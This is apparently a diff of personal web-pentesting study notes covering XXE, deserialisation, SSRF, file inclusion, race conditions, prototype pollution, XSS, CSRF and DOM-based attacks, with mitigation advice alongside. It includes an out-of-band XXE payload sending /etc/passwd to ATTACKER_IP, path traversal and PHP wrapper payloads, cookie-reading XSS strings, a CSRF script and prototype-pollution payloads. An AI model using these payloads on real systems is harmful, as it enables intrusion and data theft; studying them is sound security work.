@@ -755,34 +755,47 @@
     
     2. External Entities are similar to internal ones, but their contents are referenced from outside the XML document, such as seperate file or URL. This is the thing we are after to exploit XXE. So, if the XML parser is configured to resolve to external entities, we can use it.
     
-        <!DOCTYPE note [
-        <!ENTITY ext SYSTEM "http://example.com/external.dtd">
-        ]>
-        <note>
-            <info>&ext;</info>
-        </note>
+    <!DOCTYPE note [
+    
+    <!ENTITY ext SYSTEM "http://example.com/external.dtd">
+    
+    ]>
+    
+    <note>
+    
+        <info>&ext;</info>
+        
+    </note>
+    
       Here, '&ext;' pulls content from the specified URL which could be dangerous if the URL is controlled by an attacker.
     
     3. Parameter Entities are special types used within DTDs to define reusable structures or to include external DTD subsets. They are mainly used for maintaining large-scale XML applications.
     
-        <!DOCTYPE note [
-        <!ENTITY % common "CDATA">
-        <!ENTITY name (%common;)>
-        ]>
-        <note>
-            <name>Nischal Khadka</name>
-        </note>
-       Here, '%common;' is used within the DTD to define the type of data that the 'name' element should have.
+    <!DOCTYPE note [
+    
+    <!ENTITY % common "CDATA">
+    
+    <!ENTITY name (%common;)>
+    
+    ]>
+    
+    <note>
+    
+        <name>Nischal Khadka</name>
+        
+    </note>
+    
+      Here, '%common;' is used within the DTD to define the type of data that the 'name' element should have.
        
     4. General Entities are similar to variables and can be declared either internally or externally. 
     
     5. Character Entities are used to represent special or reserved characters that cannot be used directly in XML documents. These entities prevent the parser from being confused reagrding the XML syntax.
     
-        - '&lt;' for '<'
+        - &lt; for '<'
         
-        - '&gt;' for '>'
+        - &gt; for '>'
         
-        - '&amp;' for '&'
+        - &amp; for '&'
         
 ## XML Parsing Mechanisms:
 
@@ -807,7 +820,9 @@
 - On the other hand, Out-of-Band, means out-of-hand. That means we cannot see the server's response to the user input. So, we could try to exfiltrate the data by capturing it in our own controlled server. After we host the server, we could use the DDT with an Entity of SYSTEM and a declaration with our attacking servers IP and port that would be called in the XML document as '&xxe;', which would then connect to our machine's IP. If the connection is established successfully, we could extract the information by creating a DTD file which contains an external entity with a PHP filter to exfiltrate data from the target web application.
 
     <!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+    
     <!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
+    
     %oobxxe;
     
 - This DTD payload begins with an entity of '%cmd' that directly points to a system resource to retrieve contents of '/etc/passwd'. Base64 encoding filter is applied to encode the content in Base64 to avoid formatting problems. The '%oobxxe' entity again has another XML entity declaration 'exfil' that exfiltrates the data to the attacker-controlled server. The paramter '?data=%cmd' sends the Base64-encoded content from '%cmd'. Now, when we go back and change the payload pointing to our machines IP and the file we created, and finally decalring '&exfil;', we would have successfully exfiltrated the contents in our machine. First, the request is made to the file we created to exfiltrate the data, then on the second request the information is diclosed to us. Then, we can use cyberchef or any other tool to decode the Base64-encoded data to gain insights of the information present in '/etc/paswd'.
@@ -974,23 +989,33 @@
 
     - Python uses 'Pickle' to serialise and deserialise objects. This module converts a Python object into a byte stream (and vice versa) which enables it to be saved to a file or transmitted over a network. A representation of how python serialises and deserialises objects is given below:
     
-    import pickle
-    import base64
+        import pickle
+        
+        import base64
 
-    ...
-    serialized_data = request.form['serialized_data']
-    notes_obj = pickle.loads(base64.b64decode(serialized_data))
-    message = "Notes successfully unpickled."
-    ...
+        ...
+        serialized_data = request.form['serialized_data']
+        
+        notes_obj = pickle.loads(base64.b64decode(serialized_data))
+        
+        message = "Notes successfully unpickled."
+        ...
 
-    elif request.method == 'POST':
-        if 'pickle' in request.form:
-            content = request.form['note_content']
-            notes_obj.add_note(content)
-            pickled_content = pickle.dumps(notes_obj)
-            serialized_data = base64.b64encode(pickled_content).decode('utf-8')
-            binary_data = ' '.join(f'{x:02x}' for x in pickled_content)
-            message = "Notes pickled successfully."
+        elif request.method == 'POST':
+        
+            if 'pickle' in request.form:
+            
+                content = request.form['note_content']
+                
+                notes_obj.add_note(content)
+                
+                pickled_content = pickle.dumps(notes_obj)
+                
+                serialized_data = base64.b64encode(pickled_content).decode('utf-8')
+                
+                binary_data = ' '.join(f'{x:02x}' for x in pickled_content)
+                
+                message = "Notes pickled successfully."
             
     - Here, an object of a class 'Notes' is referred as 'notes_obj'. Basically, the class is used for managing a list of notes in this web application to manage the applications state. So, in the process of serialisation, when a user submits a note, the Notes class instance (including all notes) is serialised using 'pickle.dumps()'. This function transforms the Python object into binary format that Python can later turn back into an object during deserialisation. Then, the serialised data is encoded with Base64 because binary data contain bytes that may interfere with communication protocols like HTTP. Then, when unpickling, the base64 string is first decoded back into binary format using 'base64.b64decode()'. Then, finally the function 'pickle.loads()' reconstructs the original Python object from the binary system.
     
@@ -1012,7 +1037,7 @@
 
 ## Exploitation - Object Injection:
 
-- Pu it simply, serialisation and deserialisation means encrypting and decrypting objects state. So, if there is an insecure deserialisation done by the programmer, we can exploit it by manipulating the serialised data to execute arbitrary code of our own. Suppose a PHP web application is vulnerable to deserialisation. From source code analysis, or considering if the framework is open source, we can identify the vulnerability present. It is possible to manipulate the properties of an object by crafting our own serialised string that should contain the desried property value being using by the application. So, by preparing the payload and getting the serialised base64 encoded string will be useful to manipualte the web application to decode it, and execute our desired intentions.
+- Pu it simply, serialisation and deserialisation means encrypting and decrypting objects state. So, if there is an insecure deserialisation done by the programmer, we can exploit it by manipulating the serialised data to execute arbitrary code of our own. Suppose a PHP web application is vulnerable to deserialisation. From source code analysis, or considering if the framework is open source, we can identify the vulnerability present. It is possible to manipulate the properties of an object by crafting our own serialised string that should contain the desired property value being using by the application. So, by preparing the payload and getting the serialised base64 encoded string will be useful to manipualte the web application to decode it, and execute our desired intentions.
 
 ## Automation Scripts:
 
@@ -1053,7 +1078,7 @@
 
 ## Blind SSRF:
 
-- If we are blind to the responses of the server, we can use Out-Of_band SSRF to leverage a seperate our-of-band communication channel instead of directly receiving responses form the target server to receive information or control the exploited server. So, by making DNS requests or any other requests to the domain or server an attacker controls, they can interpret if an SSRF vulnerability exists on the system or not. If present, internal IP addresses or the internal network's structure is exposed to the attacker.
+- If we are blind to the responses of the server, we can use Out-Of-band SSRF to leverage a seperate out-of-band communication channel instead of directly receiving responses from the target server to receive information or control the exploited server. So, by making DNS requests or any other requests to the domain or server an attacker controls, they can interpret if an SSRF vulnerability exists on the system or not. If present, internal IP addresses or the internal network's structure is exposed to the attacker.
 
 ## Remidiation:
 
@@ -1087,27 +1112,27 @@
 
 - They are a part of PHP's functionality which allows users access to various data streams. Wrappers can access and execute code through built-in PHP protocols that may lead to significant security risks if not handled properly. Some of the different string filters for a traget file '.htaccess' in PHP are:
 
-    php://filter/convert.base64-encode/resource=.htaccess
+        php://filter/convert.base64-encode/resource=.htaccess
     
-    php://filter/string.rot123/resource=.htaccess
+        php://filter/string.rot123/resource=.htaccess
     
-    php://filter/string.toupper/resource=.htaccess
+        php://filter/string.toupper/resource=.htaccess
     
-    php://filter/string.tolower/resource=.htaccess
+        php://filter/string.tolower/resource=.htaccess
     
-    php://filter/string.strip_tags/resource=.htaccess
+        php://filter/string.strip_tags/resource=.htaccess
     
 - Data Wrappers:
 
     - Data wrapper is another functionality of PHP wrapper which allows inline data embedding. It is used to embed small amounts of data directly into the application code. A common payload for this wrapper looks like this:
     
-        data:text/plain,<?php phpinfo(); ?>
+            data:text/plain,<?php phpinfo(); ?>
         
 ## Base Directory Breakouts:
 
 - In modern web applications, safeguards are in place to prevent path traversal attacks. However, they are not always safe. We can bypass insecure input handling if a server is implementing or missing out major practices by using the following payload:
 
-    ?file=/var/www/html/..//..//..//etc/passwd
+        ?file=/var/www/html/..//..//..//etc/passwd
     
 - '..//..' are still equally equivalent to '../..'
 
@@ -1134,9 +1159,445 @@
 - Implementing allowlisting for file inclusion and access.
 
 - Configuring server settings to disallow remote file inclusion and limit the scripts to access the file system.
+
+# Race Conditions
+
+- Race conditions vulnerability arises when a variable gets accessed and modified by multiple threads. It happens because of the lack of proper lock mechanisms and synchronization between different threads. So, an attacker might exploit this vulnerbaility to make a transaction multiple times to deceive the system which is beyound their balance. 
+    
+## Multi-Threading:
+
+- Program:
+
+    - a set of instructions to achieve a specific task that needs to be executed to be completed.
+    
+- Process:
+
+    - A process is a program in execution. Unlike a program which is static, a process is a dynamic entity. Some of its ket aspects are:
+    
+        - Program: executable code related to the process.
+        
+        - Memory: temporary data storage.
+        
+        - State: a process whihc usually hops between different states. New state (just created) -> Ready state (ready to run once given CPU time) -> Running state (currently running) -> Waiting state -> Terminated state. Waiting state is a state that waits for the permission before it is in the ready state.
+        
+- Threads:
+
+    - A thread is a lightweight unit of execution. It shares various memory parts and instructions with the process. There are two main approaches for running threads. One is serial, that serves one user after the other sequentially. New users are enqueued. Another is parallel where is creates a thread to serve every new user. Here, the new users are only enqueued if the maximum number of running threads is reached. 
+    
+## Race Condtions Methodolody:
+
+- Suppose we book a hotel room for a vacation. The host confirms the availability of the room and makes a reservation for us. So, then another customer calls another host and makes the reservation for the same hotel room. The other host not knowing the room has been already reserved will make this reservation for the another client as well. So, who really reserved the room? This is called race condition. Here, the two hosts who are making the reservation are "threads". Simply putting, when one thread checks a value to perform an action, another thread might change that value before the action takes place, or is updated. So, a race condition usually happens when mutiple request have been made by the user at the same time, before the thread has a chance to update the updated value or data. So, if threads is inappropriately handled, race condtions happen especially on online banking services. Even in more simple terms, the conflict between the threads that handle data modification between shared resources.
+
+- The most important thing to exploit a race condtion is understanding how the server is built such as the states in business logic of a web architecture. So, if a client passes through multiple states before a transaction is marked as complete in a web application, we could perform this action multiple times but before the thread is passed through each states. The only thing to keep in mind before exploiting race condition is timimg. So, if we can send requests to the server simultaneously for like milliseconds apart then the duplicated requests will reach the server and conflict the threads to perform the action that is not supposed to make. 
+
+## Exploiting Race Conditions:
+
+- Check how the server responds to a successfull transaction in burp suite.
+
+- Use the repeater, create a tab group, then duplicate it like 20 times for testing.
+
+- To send duplicated requests, there are three choices we can make from:
+
+    - Send group in sequence (single connection): This option establishes a single connection to the server and sends all the requests in the groups tabs before closing the connection. This is useful for testing potential client-side desync vulnerabillites.
+    
+    - Send group in Sequence (Seperate connection): This option first establishes a TCP connection, sends a single request from the group, then closes the TCP connection of the first request before repeating the process for other requests.
+    
+    - Send group in parallel: This option lets us to send the group's request in parallel, which means sending all the requests in the group at once. 
+    
+## Detection and Mitigation:
+
+- We as a penetration testers must have the knowledge of how the system behaves under normal conditions when enforced controls are enforced. The controls can be: use once, vote once, rate once, limit to balance, and limit to one every 5 minutes. Then, we could try to break this limit by exploiting race conditions.
+
+- Few of the mitigation techniques are:
+
+    - Synchronization Mechanisms: In a shared resource, only one thread must be given permission to acwuire the lock at a time as most modern programming languages provide synchronization mechanisms like locks. 
+    
+    - Atomic Operations: It refers to indivisible execution units, a set of instructions grouped together and ececuted wihtout operation. This approach ensures that an operation can finish without being interrupted by another thread. 
+    
+# Prototype Pollution
+
+- This vulnerability allows attackers to manipulate and exploit the inner workings of JavaScript applications and gain access to sensitive data and application backend. While it is most commonly discussed in the context of JavaScript, the concept can apply to any system that uses a similat prototype-based inheritance model. For language models like JAVA and C++, this might not be a common practice because they follow a class-based inheritance. These are typically static and altering a class at a runtime to affect all of its instances might not be a good idea. 
+
+## Essentials:
+
+- Objects:
+
+    - Objects are the building blocks that hold information of property. Inheritance is like passing down traits from one object to another like your ancestors passed down their genes to you. So, an object is basically an instance of a class in OOP context. The object is basically used to store specific information, organize and manage related data, making them a fundamental concept in building dynamic and interactive applications.
+    
+- Classes:
+
+    - In JavaScript, classes act as a blueprint that helps to create multiple objects with similar structures and behaviours. With the help of a class, we can instantiate objects with shared characteristics. Properties are created in a class in a constructor and can be called using "this.property=property".
+    
+- Prototype:
+
+    - Every object in JS is linked to a prototype object, which acts as a chain of command that needs to be followed by its child object. It is commonly referred as the prototype chain. This prototype then serves as a template or blueprint for objects. If an object is created using a constructor function or a class, JS automatically sets up a link between the object and its prototype. A simple representation of object inhereting from its prototype looks like this:
+    
+                   
+                // Prototype for User 
+                
+                let userPrototype = {
+                
+                 greet: function() {
+                 
+                    return `Hello, ${this.name}!`;
+                    
+                }
+                
+                };
+            
+                // User Constructor Function
+                
+                function UserProfilePrototype(name, age, followers, dob) {
+                
+                    let user = Object.create(userPrototype);
+                    
+                    user.name = name;
+                    
+                    user.age = age;
+                    
+                    user.followers = followers;
+                    
+                    user.dob = dob;
+                    
+                    return user;
+                    
+                }
+
+                // Creating an instance
+                
+                let regularUser = UserProfilePrototype('Nischal K', 23, 1000, '11/18/2002');
+
+                // Using the prototype method
+                
+                console.log(regularUser.greet());
+
+- Difference between class and prototype:
+
+    - In JS, both of them are used to achieve a similar goal, which is creating objects with behaviours and characteristics. To understand the concept simply, classes is like having a detailed blueprint or a set of instructions for each model we want to develop. We folloe this blueprint exactly to create a model which have the exact same features and behaviours. While, a prototype is like having a basic model when can be then customised or modified by adding features directly on the model itself. With prototypes, we start with a simple object, then behaviours are added to the object by linking it to a prototype object that already has those behaviours. So, and object created this way are linked through the prototype chain, allowing them to inherit behaviours from other objects. This method is more dynamic and flexible.
+    
+- Inheritance:
+
+    - Inheritance is simply inhereting properties from one object to another one, creating a hierarchy of related objects. This trait helps to create a more specialised object while resuing the common properties from a parent object. JavaScript supports both classes and prototype-based inheritance.
+    
+        - Prototype-based Inheritance: 'Object.create()' is used to create a new object with a specified prototype or we can directly modify the prototype of an existing object using its prototype property.
+        
+        - Class-based Inheritance: JS also supports classes that provides a more familiar syntax for defining objects and inheritance. Under the hood, classes still use prototypes.
+        
+## How it Works?
+
+- A prototype pollution is a vulnerability that arises when an attacker manipulates an object's prototype, impacting all the instances of that object. So, an attacker can exploit this flaw by modifying shared properties or injecting malicious behaviour across objects.
+
+- Prototype pollution alone might not always expose a exploitable threat however, it's impact is severely increased if it joins with other types of vulnerabilities such as XSS and CSRF.
+
+- In JS, the '__proto__' property is a common way to access the prototype of an object, which points to the object from which it inherits its properties and methods. So, an attacker can execute this property to inject malicious behaviours of across objects or modify shared properties using any attack vector like XSS, CSRF etc. 
+
+## Exploitation - XSS:
+
+- We know that multiple properties are inherently present on the Object prototype in JavaScript. The most common properties that stand out are 'constructor' and '__proto__' which are the preferred targets for exploitation by attackers. The constructor property points to the function that constructs an object's prototype, while __proto__ is a reference to the prototype object that the current object directly inherits from. 
+
+- Golden Rule:
+
+    - This rule focuses on an attacker's ability to influence certain key parameters, such as 'x' and 'val', in expressions like 'Person[x][y] = val'. So, if an attacker sets __proto__ to 'x', the attritube defined by 'y' is universally set across all objects sharing the same class as the object with the value denoted by 'val'.
+    
+- Few Important Functions:
+
+    - When looking for potential prototype pollution, we should focus on commonly used vectors/functions that is vulnerable to prototype pollution. So, it is very important to know how an application handles object manipulation.
+    
+    - Property Definition by Path: Functions that set object properties based on a given path like 'object[a][b][c] = value', it can be dangerous if the path components are controlled by user input. Suppose an endpoint allows users to update reviews about any friend in a web app. Then, we can update the path to target the prototype with this payload:
+    
+        { "path": "reviews[0].content", "value": "&#60;script&#62;alert('xss')&#60;/script&#62;"
+        
+        Here we used the _set function from lodash property to apply the payload and adding the review content to the specified path within a profile's object assuming the '_set' function is sued. By doing code analysis, we can perform property definition by path attack.
+        
+## Exploitation - Property Injection:
+
+- Object Recursive Merge is a function that recursively merges properties from source objects into a target object. An attacker can exploit this functionality if the merge function does not validate its input and allows merging properties into the prototype chain. So, we can pollute the prototype by sending request that contains '__proto__' with a 'newProperty' and value as:
+
+    {"__proto__": {"newProperty": "hacked"}}
+    
+  The merge function will consider the __proto__ as a property and will call the 'obj.__proto__.newProperty=value'. So, by doing this the newly added property is not directly added to the current object, but it is added to the object's prototype. 
+  
+## Exploitation - Denial of Service:
+
+- An attacker can manipulate the prototype of a widely used object that may cause the application to crash. So, if an attacker pollutes the 'Object.prototype.toString' method, every subsequent call to this method by any abject will execute the altered behaviour. So, if we can try and send payload that will override an existing function like 'toString()', and then call it on some object, it will trigger an unintended behaviour for the server.
+
+- Assuming the web application uses merge function without input sanitisation, we can easily take down the server by polluting the prototype object by a simple payload like this:
+
+    {"__proto__": {"toString": "Just crash the server"}}
+    
+  As this function is universally used in JS to convert object into a string, it is an ideal candidate for testing a DoS.
+  
+## Automating the process:
+
+- Unlike other security issues that could be identified by looking for specific patterns or signs, finding prototype pollution is really hard and a deep dive into the website's code is crucial. So, it is all about understanding how objects in JS can affect each other and spotting where something might go wrong. 
+
+- Few Important Scripts:
+
+    - NodeJsScan
+    
+    - Prototype Pollution Scanner
+    
+    - PPFuzz
+    
+    - BlackFan
+
+- While looking for prototype pollution, it is very important to look for instances where user-controlled input might influence the keys or properties being merged, defined, or cloned. 
+
+## Mitigation Measures:
+
+- For Pentester:
+
+    - Input Fuzzing and Manipulation
+    
+    - Context Analysis and Payload Injection
+    
+    - CSP Bypass and Payload Injection
+    
+    - Dependency Analysis and Exploitation
+    
+    - Static Code Analyis
+    
+- For Developers:
+
+    - Avoid using __proto__
+    
+    - Immutable Objects
+    
+    - Encapsulation
+    
+    - Input Sanitisation
+    
+    - Dependency Management
+    
+    - Security Headers
+    
+# XSS
+
+- Cross-site Scripting (XSS) is a vunerability that allows as attacker to inject malicious script in a website to run on a user's browser. So, an XSS attack basically exploit the user's trust in the vulnerable web application. Consequently, XSS bypass the Same-Origin-Policy (SOP), which is a security mechanism implemented in modern web browsers for preventing a malicious script from gaining access to sensitive data on another page. XSS dodges SOP as it executes from the same origin. 
+
+- Types of XSS:
+
+    - Reflected XSS: This attack relies on the user-controlled input which is then reflected to the user. For example, if we search for a particular term and the resulting page displays the term we searched for, then an attacker can inject a malicious script within the search term.
+    
+    - Stored XSS: This attack relies on the user input which is stored in the website's database. If users can write certain reviews that are stored in the database and displayed to other users, then an attacker would try to inject a malicious script in the review which will then be executed in the browsers of other users when they view the review. 
+    
+    - DOM-based XSS: This attack particularly exploits vulnerbailites within the Document Object Model to manipulate existing page elements without needing to be reflected or stored in the server. 
+    
+## Implications of XSS:
+
+- Session Hijacking
+
+- Social Engineering
+
+- Content Manipulation and defacement
+
+- Data exfiltration
+
+- Malware installation
+
+## Reflected XSS:
+
+- It is often triggered through crafted URL or form submission. If we consider a search query containing '<script>alert(document.cookie)</script>, many users would not be suspicious about the URL. But if it is processed by a vulnerable web app, then it will be executed within the context of the user's browser. 
+
+## Stored XSS:
+
+- This type of XSS occurs when the application stores user-supplied input and later embeds it in web pages which is served to other users without proper sanitization or escaping. Some of the places for this vulnerability to exist are web forum posts, product reviews, comment sections, and other places where data are stored and can also be viewed by other users. This vulnerbility stays low until other users access this stored content which will be then executed in their browser. 
+
+## DOM-based XSS:
+
+- This XSS is completely browser-based and does not need to go to the server and back to the client. This XSS only targets the Document Object Model, which is a programming interface that represents a web document as a tree. The tree starts with 'document' node and then branches into 'DOCTYPE' and 'html'. The 'html' node then branches into 'head' and 'body'. Body is also branched where the actual content of a web page is displayed in elements. This branch follows a tree like structure that decides how the web page should be displayed. So, manipulating a DOM tree is the key here to achieve a DOM-based XSS. For example, we can create a new element in a DOM using 'document.createElement()' and add a child to any element using 'element.append()'.
+
+
+## Context:
+
+- If we want to inject a XSS payload, then the most suitable part to target will be between HTML tags, within HTML tags, and inside JavaScript. For this, we need to figure out where the vulnerable thing actually exists first.
+
+- So, when XSS happens between HTML tags, we can run:
+
+    <script>alert(document.cookie)</script>
+    
+- When the injection is within an HTML tag, then we need to end the HTML tag then inject out script like this:
+
+    ><script>alert(document.cookie)</script>
+    
+- If the injection is possible within an existing JavaScript, then we need to end the script and continue with our payload. Here we can start with '</script> to end the script and continue from here on. If our payload gets executed within a Javascript string, then we can close the string, complete the command, and execute our command, then comment out the rest of the line like this:
+
+    ';alert(document.cookie)//
+    
+- So, understanding where actually our XSS payload is being executed from is very important for the successful execution of the payload. 
+
+## Evasion:
+
+- There are many repositories that helps in building our own payload according to the context of the attack and the web application. If there are filters blocking the payloads, then we could bypass length restriction through various means. Evading the blocklists also have variety of tricks to choose from such as horizontal tab, a new line, or a carriage return which would break the payload and evade the detection engine. 
+
+# CSRF
+
+- CSRF is a type of security vulnerability where an attacker can trick a user's web browser into performing unwanted action on a trusted site where the user is authenticated. 
+
+- Cycle of CSRF:
+
+    - Attacker already knows the format of the web application's request and response, so they can send malicious link to the user impersonating the server.
+    
+    - An authenticated user clicks the link shared by the attacker. 
+    
+## Types of CSRF:
+
+- Traditional CSRF:
+
+    - This frequently concentrate on state-changing actions carried out by submitting forms. Victim will be tricked to submit a form sent by the attacker not knowing the associated data like cookies, URL parameters, etc. Then, the victim's browser sends an HTTP request to a web application form where the user is already authenticated. Crafted malicious links could be used to transfer suppose the victim's bank balance the moment the victim clicks on the link.
+    
+- XMLHttp Request CSRF:
+
+    - It is an asynchronous CSRF exploitation when operations are initiated without a complete page request and response cycle. This is more likely to appear on online apps that leverage asynchronous server communication (via XMLHttpRequest ot the Fetch API) and JavaScript to produce more dynamic user interfaces. 
+    
+    - Suppose an online email client, where users may change their email preferences without reloading the page. If such application is CSRF vulnerable, then an attacker can simply craft a fake asynchronous HTTP request, usually a POST request, and alter the victim's email preferences, forwarding all their information to a malicious address. The steps this attack would take to succeed will look like this:
+    
+        - Victim opens a session saved in their browser's cookies and logs in to the email client.
+        
+        - Victim opens a malicious webpage sent by the attacker with a script that could actually send queries to the legit email client application.
+        
+        - To modify the user's email forwarding preferences, the malicious script on the attackers page will then make an AJAX call to mail.com/api/updateEmail (using the XMLHttpRequest or Fetch)
+        
+        - The session cookie of the application will also get included with the AJAX request in the victims browser so the server will just accept it.
+        
+        - After receiving the AJAX request, the email client will evaluate it and modify the victim;s settings without the user being aware of it if no CSRF defense has been applied.
+        
+## Techniques:
+
+- Basic CSRF - Hidden Link/Image Exploitation:
+
+    - An attacker will use this trick to trick the user where they inserts a 0x0 pixel image or a link into a webpage that is nearly undetected by the user. Typically, the 'src' or 'href' element of the image is set to the destination URL intended by the atacker. So, a carefully crafted link and a little bit of social engineering could lure the victim to click the link. 
+    
+- Double Submit Cookie Bypass:
+
+    - A CSRF token is a unique value that is associated with a user's session which ensures each request comes from a legitimate source. So, a double submit cookies technique is an implementation where a cookie value corresponds to a value in a hidden form field. When a server receives a request, it checks that the cookie value matches the form field value.
+    
+    - Talking about the working mechanism of this implementation, first a token is generated when a user logs in or initiates a session by generating an unique CSRF token. This token is then sent to the user's browser both as a cookie (CSRF-Token cookie) and also embedded in hidden form fields of web forms where actions are performed (like money transfer). Upon submiting the form, two versions of the CSRF-Token are sent to the server, one in the cookie and one in the part of the form data. The server then validates both cookie to be equal, if not the request is denied.
+    
+    - TO bypass this strong security mechanism, we have many techniques at hand:
+    
+        - Session Cookie Hijacking (Man in the Middle Attack)
+        
+        - Subverting the Same-Origin Policy (Attacker Controlled Subdomain)
+        
+        - Exploiting XSS Vulnerabilities
+        
+        - Predicting or Intefering with Token Generation
+        
+        - Subdomain Cookie Injection
+        
+- Samesite Cookie Bypass:
+
+    - These cookies comes with special attribute in them that are designed to control what is being sent with corss-site requests. There are three potential values for the attribute which are:
+    
+        - Lax: Lax SameSite cookies provide a moderate level of protection by allowing the cookies to be sent in top-level navigations and safe HTTP methods like GET, HEAD, and OPTIONS. Cookies will not be sent with cross-site POST requests which helps to mitigate certain types of CSRF attacks to some extent. But, still the cookies in the GET requests can be at risk if senstive information is stored in those cookies.
+        
+        - Stric: Strict SamaSite cookies are the guardian that offers the highest level of protection by restricting the cookies to be only sent in a first-party context. This means that cookies are only sent with requests originating from the same site that set the cookie.
+        
+        - None: None SameSite cookies are sent with both first-party and cross-site requests, making them them convinient for scenarios where cookies need to be accessible across different origins. To prevent the security risks related to to cross-site requests, they require the 'Secure' attribute if thhe request is made over HHTTPS.
+        
+- XMLHTTPRequest Exploitation:
+
+    - CSRF is like someone making your browser do things without you knowing like sending a request where you are logged in. These attacks still succeed even when AJAX requests are subject to the Same-Origin-Policy (SOP), which typically forbids cross-origin requests. A simple way how an attacker can chain the information known about a web application and client to update a password on a certain application can be:
+    
+        <script>
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'http://example.com/updatepassword', true);
+            xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+                    alert("Action executed!");
+                }
+            };
+            xhr.send('action=execute&parameter=value');
+        </script>
+    
+      The XMLHttpRequest above is designed to submit form data to the server and include custom headers. The complete process of sending requests will be seamless as the requests are performed in JavaScript using AJAX.
+      
+- Same Origin Policy (SOP) and Cross-Origin Resource Sharing (CORS) Bypass:
+
+    - CORS and SOP bypass to launch CSRF is like an attacker using a trick to make your web browser send requests to a different website than the one you are currently on. Under a stable CORS policy, certain requests can only be submitted by recognised origins, but misconfigurations in CORS policies can allow attackers to circumvent these limitations if they rely on origins that the atacker can control. In a CORS configuration the header 'Access-Control-Allow-Credentials' should never be set to '*'. This means it allows requests from any origin, and hence it can be vulnerable to CSRF attacks. So, ensuring to set this header to only trusted origins is a must. 
+    
+## Defence Mechanisms:
+
+- CSRF plays an important role for pentesters like us which lets us simulate real world attack and chain the vulnerability to weaponize the effects of the vulnerability. So, some critical measures that are recommended for testing of such vulnerabilites are:
+
+    - CSRF Testing: Try to actively test applications for CSRF by attempting to execute unauthorised actions through manipulated requests and assess the effectiveness of the implemented protiections.
+    
+    - Boundary Validation: Check for an app's validation mechanisms like if the user inputs are validated and anti-CSRF tokens are present and correctly verified to prevent request forgery.
+    
+    - Security Headers Analysis: Look for headers such as CORS and Referer, and test attack vectors on them to ensure their security.
+    
+    - Session Management Testing: Ensure the session tokens are securely generated, transmitted, and validated to prevent unauthorised access and actions.
+    
+    - CSRF Exploitation Scenarios: Explore with all might, embed malicious requests in image tags or exploit trusted endpoint to identify possible weakness in the applications defenses and improve security posture. 
+    
+# DOM-Based Attacks
+
+- DOM refers to the Document Object Model, which is the programming interface that displays the web document. When we make a request to a web application, the HTML in the response is loaded as the DOM in the browser. Once loaded, JavaScript can interface with the DOM and make updates to changes what the user sees. DOM has a tree-like structure which allows developers to use JavaScript code to search or modify specific elements. 
+
+## Modern Frontend frameworks:
+
+- Back in the old days, each time a user navigated to a different section in the web application, the response provided to the request made would provide completely new HTML code, and the DOM would rebuild from the scratch. But, with time the modern frontend framework uses new web application model called the single page application (SPA). SPAs are loaded the first time a user visits the website, and all code is loaded in the DOM. Then, when using JavaScript, instead of reloading the DOM with each new request, the DOM is automatically updated with the data required to update the DOM. So, instead of the web server being responsible for DOM as well, the SPA is loaded once and then interfaces with the web server through API requests.
+
+## DOM-Based Attacks:
+
+- The Blind Server-Side:
+
+    - This attack can be summarized by insufficiently validating and sanitising user input before using it in JavaScript, which will alter the DOM. In modern web applications, developers will implement functions that alter the DOM without making any new requests to the web server or API. So, as there is no need to refresh the data being shown to the user, the attack surface increases where the client-side security controls should be given a lot of priority.
+    
+- The Source and the Sink:
+
+    - All DOM-based attacks initiate with untrusted user input making its way to JavaScript that modifies the DOM. So, a source is the location where untrusted user input is provided by the user to a JS function, and the sink is the location where the data is used in JS to update the DOM. 
+    
+- DOM-based Open Redirection:
+
+    - Lets take a look at the following JS code that determines the location of navigation for the web app:
+    
+        goto = location.hash.slice(1) if (goto.startsWith('https:')) {   location = goto; }
+    
+      Here, the source is 'location.hash.slice(1)' parameter which will take the first '#' element in the URL. So, without proper sanitisation, this value is directly set in the location of the DOM, which is the sink. To exploit this we can construct a URL to exploit this flaw:
+      
+        https://example.com/#https://attacker.com
+        
+      Now, when the DOM loads, the Javascript will recover the '#' value of attacker's domain and perform a redirect to our malicious website. There exists many DOM-based attacks, but for every single one of them to be exploitable, the common principle is an user input directly being used in a JS element without sanitisation or validation allowing attackers to control a part of the DOM.
+      
+## DOM-based XSS:
+
+- As with all DOM-based attack, we need a source and a sink to perform the atack, this attack allows us to inject JS code and take full control of the browser. The most common source for DOM-based XSS is the URL, or URL fragments which are accessed thorough the 'window.location' source. But, most modern browsers implement URL encoding on the data, which can prevent this attack. 
+
+- DOM-based XSS via jQuery:
+
+    - We can inject an XSS payload into jQuery's $() selector sink. Is we have access to the hash value source then, we can craft an URL to:
+    
+        https://example.com#<img src=1 onerror=alert(1)></img>
+        
+      This payload allows us to XSS ourselves, so to perform this on other users, we need to find a way to trigger the 'hashchange' function automatically. The simplest option we have is to leverage an iFrame to deliver out payload like this:
+      
+        <iframe src="https://example.com#" onload="this.src+='<img src=1 onerror=alert(1)>'
+        
+      Once the website loads, the 'src' value is updated to now include our XSS payload trigerring the 'hashchange' function and the XSS payload itlself. Several other sinks can be used to exploit a vulnerable DOM implementation. This includes normal JavaScript sinks and frameworks-specific ones such as for jQuery and Angular. The main thing to give priority is the weaponisation of DOM-based XSS, if not we are just performing a self-XSS which has no value.
+      
+- DOM-Based XSS vs Conventional XSS:
+
+    - The key difference here is where the sink resides. If the untrusted user data is already injected into the sink server, and the response contains the payload, then it is conventional XSS. However, if the DOM is already loaded and then later on receives untrusted user data loaded through JS, then it is DOM-based. 
+    
+## XSS Weaponisation:
+
+- To weaponise DOM-based XSS, we need to rely on the two conventional delivery methods of XSS payloads, storage and reflection. DOM-based XSS is harder to exploit because without a proper delivery method. So, we either need the web server to store out payload for later delivery or deliver the payload through reflection. As most modern web browsers encodes URL, so if the source is the URL then it can be tricky to achieve reflected XSS. So, if we perform XSS through stored user data, we need to find the sink where the data is added without sanitisation or validation. 
+
